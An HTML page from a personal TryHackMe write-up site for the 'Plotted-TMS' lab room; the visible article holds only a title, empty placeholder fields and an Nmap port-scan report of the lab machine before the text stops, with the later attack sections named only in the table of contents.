@@ -1,0 +1,1324 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../AllInOne/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.13">
+    
+    
+      
+        <title>Plotted-TMS - THM Writeups | Vasanth Vanan</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ffa9267a.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.a0c5b2b5.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#scanning" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="THM Writeups | Vasanth Vanan" class="md-header__button md-logo" aria-label="THM Writeups | Vasanth Vanan" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            THM Writeups | Vasanth Vanan
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Plotted-TMS
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/VasanthVanan/tryhackme-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      Home
+    </a>
+  </li>
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../colddbox/" class="md-tabs__link md-tabs__link--active">
+        Easy Challenges
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../medium/index.md" class="md-tabs__link">
+        Medium Challenges
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../hard/index.md" class="md-tabs__link">
+        Hard Challenges
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../insane/index.md" class="md-tabs__link">
+        Insane Challenges
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="THM Writeups | Vasanth Vanan" class="md-nav__button md-logo" aria-label="THM Writeups | Vasanth Vanan" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    THM Writeups | Vasanth Vanan
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/VasanthVanan/tryhackme-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          Easy Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Easy Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../colddbox/" class="md-nav__link">
+        ColddBox Easy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ARcHanG3l/" class="md-nav__link">
+        ARcHanG3l
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ToolsRUs/" class="md-nav__link">
+        ToolsRUs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE-2021-29447/" class="md-nav__link">
+        Wordpress CVE
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Tech_Supp0rt/" class="md-nav__link">
+        Tech_Supp0rt-1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AllInOne/" class="md-nav__link">
+        All in One
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Plotted-TMS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Plotted-TMS
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#scanning" class="md-nav__link">
+    Scanning
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    Initial Access
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-plot_admin" class="md-nav__link">
+    Gaining User access (plot_admin)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-root-access" class="md-nav__link">
+    Gaining Root access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+        
+      
+      <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          Medium Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Medium Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../medium/index.md" class="md-nav__link">
+        None
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+        
+      
+      <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          Hard Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Hard Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hard/index.md" class="md-nav__link">
+        None
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+        
+      
+      <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          Insane Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Insane Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../insane/index.md" class="md-nav__link">
+        None
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#scanning" class="md-nav__link">
+    Scanning
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    Initial Access
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-plot_admin" class="md-nav__link">
+    Gaining User access (plot_admin)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-root-access" class="md-nav__link">
+    Gaining Root access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+  <h1>Plotted-TMS</h1>
+
+<p><a class="md-button" href="https://tryhackme.com/room/plottedtms">TryHackMe Link</a></p>
+<div class="admonition example">
+<p class="admonition-title">Description</p>
+<p><p id="desc" style="font-size:15px"></p></p>
+</div>
+<h2 id="scanning"><b>Scanning</b><a class="headerlink" href="#scanning" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b></p>
+</li>
+<li>
+<p>Open Ports: </p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center"><p style="font-size:14px; color: black">PORT</p></th>
+<th align="center"><p style="font-size:14px; color: black">SERVICE</p></th>
+<th align="center"><p style="font-size:14px; color: black">DESCRIPTION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center"><p id="p1" style="font-size:14px; color: purple"></p></td>
+<td align="center"><p id="s1" style="font-size:14px; color: purple"></p></td>
+<td align="center"><p id="d1" style="font-size:14px; color: purple"></p></td>
+</tr>
+<tr>
+<td align="center"><p id="p2" style="font-size:14px;  color: purple"></p></td>
+<td align="center"><p id="s2" style="font-size:14px; color: purple"></p></td>
+<td align="center"><p id="d2" style="font-size:14px; color: purple"></p></td>
+</tr>
+<tr>
+<td align="center"><p id="p3" style="font-size:14px;  color: purple"></p></td>
+<td align="center"><p id="s3" style="font-size:14px; color: purple"></p></td>
+<td align="center"><p id="d3" style="font-size:14px; color: purple"></p></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Nmap Report:
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="m">7.93</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="m">2023-02-26</span><span class="w"> </span><span class="m">09</span><span class="o">:</span><span class="m">29</span><span class="w"> </span><span class="n">EST</span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="m">10.10</span><span class="n">.</span><span class="m">72.232</span>
+<span class="n">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nf">up </span><span class="p">(</span><span class="m">0.17</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="n">.</span>
+
+<span class="n">PORT</span><span class="w">    </span><span class="n">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span>
+<span class="hll"><span class="m">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="n">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="m">8.2</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="m">4</span><span class="nf">ubuntu0.3 </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="m">2.0</span><span class="p">)</span>
+</span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span><span class="nf">a36a9cb11260b272130984cc3873444f </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="nf">b93f8400f4d1fdc8e78d98033874a14d </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="nf">d08651606946b2e139439097a6af9693 </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="hll"><span class="m">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="m">2.4</span><span class="n">.</span><span class="m">41</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+</span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Apache2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Default</span><span class="w"> </span><span class="n">Page</span><span class="o">:</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="n">works</span>
+<span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="m">2.4</span><span class="n">.</span><span class="m">41</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="hll"><span class="m">445</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="m">2.4</span><span class="n">.</span><span class="m">41</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+</span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Apache2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Default</span><span class="w"> </span><span class="n">Page</span><span class="o">:</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="n">works</span>
+<span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="m">2.4</span><span class="n">.</span><span class="m">41</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="o">:</span><span class="w"> </span><span class="n">OS</span><span class="o">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="o">:</span><span class="w"> </span><span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">linux</span><span class="o">:</span><span class="n">linux_kernel</span>
+
+<span class="n">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">results</span><span class="o">:</span>
+<span class="o">|</span>_<span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="o">:</span><span class="w"> </span><span class="n">Protocol</span><span class="w"> </span><span class="n">negotiation</span><span class="w"> </span><span class="nf">failed </span><span class="p">(</span><span class="n">SMB2</span><span class="p">)</span>
+
